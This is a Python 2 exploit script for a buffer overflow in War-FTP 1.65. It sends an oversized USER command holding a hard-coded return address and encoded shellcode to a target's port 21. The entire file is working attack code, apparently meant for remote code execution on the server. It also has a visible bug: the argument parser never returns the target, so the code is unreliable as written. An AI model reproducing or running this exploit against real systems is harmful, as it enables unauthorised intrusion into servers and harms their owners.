import socket,sys,argparse

def arguments():
	parser = argparse.ArgumentParser(description="War-Ftp 1.65 Exploit")
	parser.add_argument('-t', '--target', help="Target to Exploit", type=str)
	args = parser.parse_args()
	if args.target is None:
		sys.exit(args.print_help())

def main(target):
	shellcode =  ""
	shellcode += "\xda\xd8\xbe\x55\xb3\xc8\xf0\xd9\x74\x24\xf4\x58\x2b"
	shellcode += "\xc9\xb1\x56\x31\x70\x18\x83\xc0\x04\x03\x70\x41\x51"
	shellcode += "\x3d\x0c\x81\x17\xbe\xed\x51\x78\x36\x08\x60\xb8\x2c"
	shellcode += "\x58\xd2\x08\x26\x0c\xde\xe3\x6a\xa5\x55\x81\xa2\xca"
	shellcode += "\xde\x2c\x95\xe5\xdf\x1d\xe5\x64\x63\x5c\x3a\x47\x5a"
	shellcode += "\xaf\x4f\x86\x9b\xd2\xa2\xda\x74\x98\x11\xcb\xf1\xd4"
	shellcode += "\xa9\x60\x49\xf8\xa9\x95\x19\xfb\x98\x0b\x12\xa2\x3a"
	shellcode += "\xad\xf7\xde\x72\xb5\x14\xda\xcd\x4e\xee\x90\xcf\x86"
	shellcode += "\x3f\x58\x63\xe7\xf0\xab\x7d\x2f\x36\x54\x08\x59\x45"
	shellcode += "\xe9\x0b\x9e\x34\x35\x99\x05\x9e\xbe\x39\xe2\x1f\x12"
	shellcode += "\xdf\x61\x13\xdf\xab\x2e\x37\xde\x78\x45\x43\x6b\x7f"
	shellcode += "\x8a\xc2\x2f\xa4\x0e\x8f\xf4\xc5\x17\x75\x5a\xf9\x48"
	shellcode += "\xd6\x03\x5f\x02\xfa\x50\xd2\x49\x92\x95\xdf\x71\x62"
	shellcode += "\xb2\x68\x01\x50\x1d\xc3\x8d\xd8\xd6\xcd\x4a\x69\xf0"
	shellcode += "\xed\x85\xd1\x91\x13\x26\x21\xbb\xd7\x72\x71\xd3\xfe"
	shellcode += "\xfa\x1a\x23\xfe\x2e\xb6\x29\x68\x11\xee\x2f\x01\xf9"
	shellcode += "\xec\x2f\xc0\xa5\x79\xc9\xb2\x05\x29\x46\x73\xf6\x89"
	shellcode += "\x36\x1b\x1c\x06\x68\x3b\x1f\xcd\x01\xd6\xf0\xbb\x7a"
	shellcode += "\x4f\x68\xe6\xf1\xee\x75\x3d\x7c\x30\xfd\xb7\x80\xff"
	shellcode += "\xf6\xb2\x92\xe8\x60\x3c\x6b\xe9\x04\x3c\x01\xed\x8e"
	shellcode += "\x6b\xbd\xef\xf7\x5b\x62\x0f\xd2\xd8\x65\xef\xa3\xe8"
	shellcode += "\x1e\xc6\x31\x54\x49\x27\xd6\x54\x89\x71\xbc\x54\xe1"
	shellcode += "\x25\xe4\x07\x14\x2a\x31\x34\x85\xbf\xba\x6c\x79\x17"
	shellcode += "\xd3\x92\xa4\x5f\x7c\x6d\x83\xe3\x7b\x91\x51\xcc\x23"
	shellcode += "\xf9\xa9\x4c\xd4\xf9\xc3\x4c\x84\x91\x18\x62\x2b\x51"
	shellcode += "\xe0\xa9\x64\xf9\x6b\x3c\xc6\x98\x6c\x15\x86\x04\x6c"
	shellcode += "\x9a\x13\xb7\x17\xd3\xa4\x38\xe8\xfd\xc0\x39\xe8\x01"
	shellcode += "\xf7\x06\x3e\x38\x8d\x49\x82\x7f\x9e\xfc\xa7\xd6\x35"
	shellcode += "\xfe\xf4\x29\x1c"

	buffer = "A" * 485 + "\x7b\x46\x86\x7c" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, 21))
	response = sock.recv(1024)
	print response

	sock.send('USER ' + buffer + '\r\n')
	response = sock.recv(1024)
	print response
	sock.send('PASS PASSWORD\r\n')
	sock.close()

if __name__ == '__main__':
	main(arguments())